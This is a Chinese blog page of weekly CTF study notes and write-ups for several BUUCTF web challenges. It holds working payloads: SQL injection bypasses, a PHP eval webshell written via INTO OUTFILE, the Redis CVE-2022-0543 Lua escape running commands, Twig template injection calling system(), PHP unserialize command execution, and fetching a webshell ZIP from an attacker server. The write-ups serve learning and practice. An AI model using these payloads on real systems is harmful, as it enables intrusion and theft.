<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>UKY周报（完结） | Fisssssh-Blog</title><meta name="author" content="fisssssh"><meta name="copyright" content="fisssssh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="10.27–11.2周本周复现了newstar2024的week1-week3，并且做了六道buu的题目，php代码审计偏多​    对之前较为模糊的知识点进行了补充，如php伪协议，cookie的组成和部分php代码绕过等​    1.如果直接传参名 NewStar_CTF.2024会发现并没有用。这是由 NewStar_CTF.2024 中的特殊字符 . 引起的，PHP 默认会将其解析为 Ne">
<meta property="og:type" content="article">
<meta property="og:title" content="UKY周报（完结）">
<meta property="og:url" content="http://example.com/2025/11/23/UKY%E5%91%A8%E6%8A%A5/index.html">
<meta property="og:site_name" content="Fisssssh-Blog">
<meta property="og:description" content="10.27–11.2周本周复现了newstar2024的week1-week3，并且做了六道buu的题目，php代码审计偏多​    对之前较为模糊的知识点进行了补充，如php伪协议，cookie的组成和部分php代码绕过等​    1.如果直接传参名 NewStar_CTF.2024会发现并没有用。这是由 NewStar_CTF.2024 中的特殊字符 . 引起的，PHP 默认会将其解析为 Ne">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/9ad575f9f19896781142d83c5cc85a3c.jpg">
<meta property="article:published_time" content="2025-11-23T09:26:55.000Z">
<meta property="article:modified_time" content="2025-11-29T13:16:45.000Z">
<meta property="article:author" content="fisssssh">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/9ad575f9f19896781142d83c5cc85a3c.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "UKY周报（完结）",
  "url": "http://example.com/2025/11/23/UKY%E5%91%A8%E6%8A%A5/",
  "image": "http://example.com/img/9ad575f9f19896781142d83c5cc85a3c.jpg",
  "datePublished": "2025-11-23T09:26:55.000Z",
  "dateModified": "2025-11-29T13:16:45.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "fisssssh",
      "url": "http://example.com"
    }
  ]
}</script><link rel="shortcut icon" href="/img/head.jpg"><link rel="canonical" href="http://example.com/2025/11/23/UKY%E5%91%A8%E6%8A%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'UKY周报（完结）',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/hexo-electric-clock@1.0.6/clock.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
<link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-categories-card@1.0.0/lib/categorybar.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      if ($loadingBox.classList.contains('loaded')) return
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()

  if (document.readyState === 'complete') {
    preloader.endLoading()
  } else {
    window.addEventListener('load', preloader.endLoading)
    document.addEventListener('DOMContentLoaded', preloader.endLoading)
    // Add timeout protection: force end after 7 seconds
    setTimeout(preloader.endLoading, 7000)
  }

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/3f7be0b24671e6f36245047988e9fd18.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/9ad575f9f19896781142d83c5cc85a3c.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Fisssssh-Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">UKY周报（完结）</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">UKY周报（完结）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-23T09:26:55.000Z" title="发表于 2025-11-23 17:26:55">2025-11-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-29T13:16:45.000Z" title="更新于 2025-11-29 21:16:45">2025-11-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">8.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>34分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="10-27–11-2周"><a href="#10-27–11-2周" class="headerlink" title="10.27–11.2周"></a>10.27–11.2周</h1><h3 id="本周复现了newstar2024的week1-week3，并且做了六道buu的题目，php代码审计偏多"><a href="#本周复现了newstar2024的week1-week3，并且做了六道buu的题目，php代码审计偏多" class="headerlink" title="本周复现了newstar2024的week1-week3，并且做了六道buu的题目，php代码审计偏多"></a>本周复现了newstar2024的week1-week3，并且做了六道buu的题目，php代码审计偏多</h3><p>​    对之前较为模糊的知识点进行了补充，如php伪协议，cookie的组成和部分php代码绕过等<br>​    1.如果直接传参名 NewStar_CTF.2024会发现并没有用。这是由 NewStar_CTF.2024 中的特殊字符 . 引起的，PHP 默认会将其解析为 NewStar_CTF_2024。可以使用 [ 字符的非正确替换漏洞。当传入的参数名中出现 [ 且之后没有 ] 时，PHP 会将 [ 替换为 _，但此之后就不会继续替换后面的特殊字符了因此，GET 传参 NewStar[CTF.2024即可<br>​    2.在git泄露类型题中，开发者会使用 git stash 来暂存未提交的更改。这些更改存储在 .git&#x2F;objects 中，可以被恢复。在cd到指定的目录下，恢复出的仓库中，使用 git stash list 查看暂存列表。使用 git stash apply 应用暂存，查看暂存的内容。git stash pop还原文件<br>​    3.cmd里type读取文件内容，斜杠换成反斜杠，文件名加双引号<br>​    4.有时候在传Base64 加密后的字符串时会报错，是因为不能带有&#x3D;，会被waf，这时直接删掉结尾等号即可，后者在明文后面多加一些空格以使加密结果不带等号,若最后是+的话，我们在GET传参必须将其编码为 %2B，不然+会被视作空格<br>​    5.如果有类似闯关的题目，下一关出不来的时候可以试试更新一下cookie（），如果要修改，需要拿到key之后去jwt修改后传入<br>​    6.nc (Netcat)，直接与服务器进行通信，不加其他的东西，逐字节发送和接收数据，有时候nc类题目中某些文字显示乱码，可以使用nc直接连接<br>​    7.在题目中需要要求文件内容，如file_get_contents($text,’r’)&#x3D;&#x3D;&#x3D;”welcome to the zjctf”时，可以用url写data协议直接提供内容，无需创建文件，语法data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p>
<h3 id="本周总结：学到了之前没有接触过的知识点stash，python沙盒逃逸，jwt改cookie等-补习了一下之前了解不够牢靠的部分知识点"><a href="#本周总结：学到了之前没有接触过的知识点stash，python沙盒逃逸，jwt改cookie等-补习了一下之前了解不够牢靠的部分知识点" class="headerlink" title="本周总结：学到了之前没有接触过的知识点stash，python沙盒逃逸，jwt改cookie等,补习了一下之前了解不够牢靠的部分知识点"></a>本周总结：学到了之前没有接触过的知识点stash，python沙盒逃逸，jwt改cookie等,补习了一下之前了解不够牢靠的部分知识点</h3><p>​  另外检讨一下，这周光顾打洲了，没做多少题（）<br>​  下周学习计划：争取复现完newstar2024所有题目，了解一下服务器监听，污染404页面等</p>
<h1 id="11-3–11-9周"><a href="#11-3–11-9周" class="headerlink" title="11.3–11.9周"></a>11.3–11.9周</h1><h3 id="本周复现完毕newstar2024全部题目，week4-5做下来整体感觉偏难但是5反而比4简单（），buu做了5道题，极客大挑战做了3道，学到了很多新知识点。"><a href="#本周复现完毕newstar2024全部题目，week4-5做下来整体感觉偏难但是5反而比4简单（），buu做了5道题，极客大挑战做了3道，学到了很多新知识点。" class="headerlink" title="本周复现完毕newstar2024全部题目，week4-5做下来整体感觉偏难但是5反而比4简单（），buu做了5道题，极客大挑战做了3道，学到了很多新知识点。"></a>本周复现完毕newstar2024全部题目，week4-5做下来整体感觉偏难但是5反而比4简单（），buu做了5道题，极客大挑战做了3道，学到了很多新知识点。</h3><p>​    ps：学的有点杂，大部分还是对之前的知识点的补充和深入了解。<br>​     1.sql注入过滤空格就用()将内容包裹起来，如select(table_name)from(information_schema.tables)<br>  过滤&#x3D;就用like替代，过滤by union等说明过滤了联合注入，需要采用报错注入，(extractvalue(1, concat(0x7e, (select database()))))，直接报错，并且回显到后面检测的数据库的原理继续注入<br>​    2.文件上传类有时不会把文件自动解析成php，就需要用htaccess更改服务器配置，.htaccess被禁用可以尝试.user.ini<br>​    3.本地文件读取，在对读取文件有长度限制，且通配符不可使用的情况下，应该采用文件描述符来读取目的文件，文件描述符是操作系统为进程维护的一个整数，每个进程有一个fd表，如&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3，不行就往后试（）<br>​    4.md5两次后是0e…..纯数字的是179122048<br>​    5.sql注入中select句段被禁用，可以尝试堆叠注入，同时可以使用handler命令直接读取表中的数据，例如语法：1’;HANDLER 表名 OPEN;HANDLER 表名 READ NEXT;HANDLER 表名 CLOSE;#根据题目类型插入布尔盲注或其他注入类型<br>​    6.在严格过滤的环境下获取flag，在得知flag文件名称的情况下，无法通过正常方法直接访问得到，可以尝试污染404页面，例：在flask中可以使用setattr(NotFound, ‘description’, command_result)动态修改404页面的描述内容，再跟上执行命令获取flag，将flag命令回显到404页面<br>​    7.目录穿越，利用Flask框架静态文件路由的潜在缺陷，绕过目录限制&#x2F;..&#x2F;来读取目录，需要注意的是，直接在url中访问并不会成功，因为无法对其进行正确解析，使用burpsuite等改请求来访问目标目录，进而读取到源码<br>​     8.jwt密码爆破，在得知密码的组成或大致范围之后，可以生成字典进行爆破，用jwtcrack-master，命令组成为python.exe .\crackjwt.py 当前cookie .\字典文件，需要放在根目录下<br>​    9.cms类题后台任意文件下载，任意文件解压漏洞。若容器出网，在公网服务器上放置包含 PHP 木马的 ZIP 文件，再在题目上触发下载ZIP，触发解压之后运行对应文件中的php木马执行任意命令，例如下载filepath&#x3D;apidata&amp;action&#x3D;start-download&amp;type&#x3D;0&amp;download_url&#x3D;http:&#x2F;&#x2F;公网IP&#x2F;payload.zip解压filepath&#x3D;apidata&amp;action&#x3D;file-upzip。若容器不出网，就需要先上传ZIP到服务器，再下载解压运行。<br>​    10.ROT13字母替换密码，凯撒密码的一种，偏移量固定为13，文件目录或者flag格式有问题的时候可以试一下是不是移位加密过了<br>​    11.__toString()是POP链的常见入口点，我们可以在其中调用其他方法或访问其他属性<br>​    12.原型链污染中，通过修改原型对象，影响所有基于该原型的对象。process.env 包含所有环境变量，其中子进程会继承父进程的环境变量，NODE_OPTIONS特殊环境变量，用于传递命令行参数，child_process.fork()创建Node.js子进程，而后execSync()同步执行系统命令。通过这样，就可以通过环境变量执行任意代码，例如：require(&quot;child_process&quot;).execSync(&quot;目的命令 | base64 -d &gt; &#x2F;app&#x2F;index.js&quot;)&#x2F;&#x2F;<br>​    13.如果在题目中需要更改或创建对象，应该使用put请求<br>​    14.XSS跨站脚本攻击，XSS题目的典型就是有一个bot，flag通常就在这个bot的cookie里面。我们可以通过找到一处能够输入并查看的地方写入一个恶意代码到服务端，让bot去访问运行它，进而获得cookie。拿到cookie之后的回显问题，如果题目出网，可以写命令让它发送到我们的服务器上面；如果不出网，就可以写一个JS代码让bot模拟用户操作，将Cookie在之前找到的输入点进行读取<br>​    15.Redis命令执⾏沙箱逃逸，CVE-2022-0543，Redis的Lua环境是一个公共Lua库，我们可以利用Lua的 package.loadlib函数，加载这个系统库，并调用其中的危险函数，从而执行任意命令。例如：先通过local io_l &#x3D; package.loadlib(“&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0”, “luaopen_io”);找到目的package.loadlib函数，local io &#x3D; io_l();提取表中的危险函数，local f &#x3D; io.popen(“指定命令”, “r”);r用读取模式启动命令，返回一个文件句柄，将其保存在变量f中，local res &#x3D; f:read(“*a”);结果保存在res中，return res返回res<br>​    16.sql注入中若题目提示flag不在数据库，那么我们就需要getshell写入后门文件，写一个木马，例如：-1’union select 1,2,”&lt;?php eval($_GET[1]);” into outfile “&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php”–+再通过get的参数执行任意命令</p>
<h3 id="本周总结：基本完成了本周的学习计划，学到了很多新知识点，Redis沙箱逃逸，XSS跨站脚本攻击和cms后台任意文件下载等。本周学的有点多，部分知识点目前只做过对应的一道题，并没有完全掌握，还需要后续的训练"><a href="#本周总结：基本完成了本周的学习计划，学到了很多新知识点，Redis沙箱逃逸，XSS跨站脚本攻击和cms后台任意文件下载等。本周学的有点多，部分知识点目前只做过对应的一道题，并没有完全掌握，还需要后续的训练" class="headerlink" title="本周总结：基本完成了本周的学习计划，学到了很多新知识点，Redis沙箱逃逸，XSS跨站脚本攻击和cms后台任意文件下载等。本周学的有点多，部分知识点目前只做过对应的一道题，并没有完全掌握，还需要后续的训练"></a>本周总结：基本完成了本周的学习计划，学到了很多新知识点，Redis沙箱逃逸，XSS跨站脚本攻击和cms后台任意文件下载等。本周学的有点多，部分知识点目前只做过对应的一道题，并没有完全掌握，还需要后续的训练</h3><p>下周学习计划：再次尝试一下极客大挑战，多做一点buu的题，看能不能遇到新学的知识点，把知识点实战巩固一下</p>
<h1 id="11-17—11-23周"><a href="#11-17—11-23周" class="headerlink" title="11.17—11.23周"></a>11.17—11.23周</h1><p>本周总结:这周buu崩了，我也崩了，一直发烧，没有爽做题，也没有爽打游戏，不开心的一周，但是还是学到了一些新知识，也算是很开心的事情了。个人博客也搭建的差不多了，等明年1月前后域名备案之后应该就可以正式上线了，欢迎各位来玩~</p>
<h2 id="1-网鼎杯-2020-朱雀组-phpweb"><a href="#1-网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="1.[网鼎杯 2020 朱雀组]phpweb"></a>1.[网鼎杯 2020 朱雀组]phpweb</h2><p>拿到题目访问一下，发现页面会自动刷新<img src="https://i-blog.csdnimg.cn/blog_migrate/61ab71c9a8c1f112c4aa569493eabf01.png" alt="在这里插入图片描述"></p>
<p>所以我们抓一下包<img src="https://i-blog.csdnimg.cn/blog_migrate/0499789c8210a128e0974eab7566e652.png" alt="在这里插入图片描述"></p>
<p>很明显date是一个php的函数，而p是其中的一个参数，表示输出时间。<br> 因此我们可以执行一下eval函数<img src="https://i-blog.csdnimg.cn/blog_migrate/38e13c463a71604b8ad38c4b23431990.png" alt="在这里插入图片描述"></p>
<p>很明显，被拦了。这时候我们可以考虑一下读取index.php的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%BA%90%E7%A0%81&spm=1001.2101.3001.7020">源码</a><br> 利用highlight_file函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=highlight_file&amp;p=index.php</span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9d9c7b41aa43fcf74f9a23cabf699ae3.png" alt="在这里插入图片描述"></p>
<p>得到<img src="https://i-blog.csdnimg.cn/blog_migrate/b4a1faaca13d98e591bce854f293a0a1.png" alt="在这里插入图片描述"></p>
<p>很明显这里的Test就是读取了func，需要你构造一个反序列化去绕过。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>&#123;</span></span><br><span class="line">    var $p=<span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">    var $func=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a =new Test();</span><br><span class="line">echo <span class="title function_">serialize</span><span class="params">($a)</span>;</span><br></pre></td></tr></table></figure>

<p>得到payload：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;ls /&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>传入后得到<img src="https://i-blog.csdnimg.cn/blog_migrate/0d048bb3fe8859531ccef783e7b1d690.png" alt="在这里插入图片描述"></p>
<p>然后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#构造payload</span><br><span class="line">#反序列化前的语句:find / -name flag*</span><br><span class="line">func=unserialize&amp;p=O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;find / -name flag*&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>找到存有flag 的文件夹<code>/tmp/flagoefiu4r93</code><img src="https://i-blog.csdnimg.cn/blog_migrate/25ddf6edb5f2f5f1166a221a8d35afce.png" alt="在这里插入图片描述"></p>
<p>最后找出flag：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#构造payload</span><br><span class="line">#反序列化前的语句：cat /tmp/flagoefiu4r93</span><br><span class="line">func=unserialize&amp;p=O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">22</span>:<span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/0407b52a419ce0fecb90cd14ac4d439d.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1ffa98ad-ba5d-4ce9-83b1-bdbaa1b54302&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-BJDCTF2020-The-mystery-of-ip"><a href="#2-BJDCTF2020-The-mystery-of-ip" class="headerlink" title="2.[BJDCTF2020]The mystery of ip"></a>2.[BJDCTF2020]The mystery of ip</h2><p><img src="https://i-blog.csdnimg.cn/blog_migrate/72973b03e737b882008029f2636feeb1.png" alt="在这里插入图片描述"></p>
<p>查看<code>hint</code>页面：<img src="https://i-blog.csdnimg.cn/blog_migrate/1c376f24aee082031d903098b92fbb32.png" alt="在这里插入图片描述"></p>
<p>结合题目名，IP的秘密，flag页面也出现了IP，猜测为X-Forwarded-For处有问题<br> 使用BurpSuite抓取数据包：</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/2df1f822baec2dc8fd6a1b552697fa3d.png" alt="在这里插入图片描述"></p>
<p>添加HTTP请求头：<img src="https://i-blog.csdnimg.cn/blog_migrate/4b5c788c40f1e9cefe95bab962d3c6ec.png" alt="在这里插入图片描述"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>发送数据包，得到回显页面：<img src="https://i-blog.csdnimg.cn/blog_migrate/27e5f7d7c94f4abba69119b7a247d30f.png" alt="在这里插入图片描述"></p>
<p>被成功执行，说明<code>XFF</code>可控，测试了半天，因为是php页面，所以没想到模版注入，通过查阅资料<br> <strong>Flask</strong>可能存在<strong>Jinjia2模版注入漏洞</strong><br> <strong>PHP</strong>可能存在<strong>Twig模版注入漏洞</strong></p>
<p>添加模版算式，检测其是否可被执行：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/a02b080edbb2b0a10b2bb407a5d71dc2.png" alt="在这里插入图片描述"></p>
<p>模版中算式被成功执行，尝试是否能执行命令：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/06ada0dd7119b1322a047c38b4354245.png" alt="在这里插入图片描述"></p>
<p>命令可以被成功执行，查找flag的位置：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/d638903efee7930af9721aa3f70f2423.png" alt="在这里插入图片描述"></p>
<p>在<code>/</code>目录下查找到flag，读取flag，构造payload：</p>
<img src="https://i-blog.csdnimg.cn/blog_migrate/efb5faa8e51142048bd12d3b2722154d.png" alt="在这里插入图片描述" style="zoom:150%;" />

<h2 id="3-BJDCTF2020-ZJCTF，不过如此"><a href="#3-BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="3.[BJDCTF2020]ZJCTF，不过如此"></a>3.[BJDCTF2020]ZJCTF，不过如此</h2><p>php特性</p>
<p>1.先看代码，提示了next.php，绕过题目的要求去回显next.php</p>
<p>2.可以看到要求存在text内容而且text内容强等于后面的，而且先通过这个if才能执行下面的file参数。</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/c1573b707aabe1d7cc04542ba758e166.png" alt="img"></p>
<p>3.看到用的是file_get_contents()函数打开text。想到用data:&#x2F;&#x2F;协议，可以想成创建了临时文件读取</p>
<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php</p>
<p>得到页面源码，接着base64解码</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/0bfe0c67bc61ad2d596ba43c571ea9e3.png" alt="image-20240124204402834"></p>
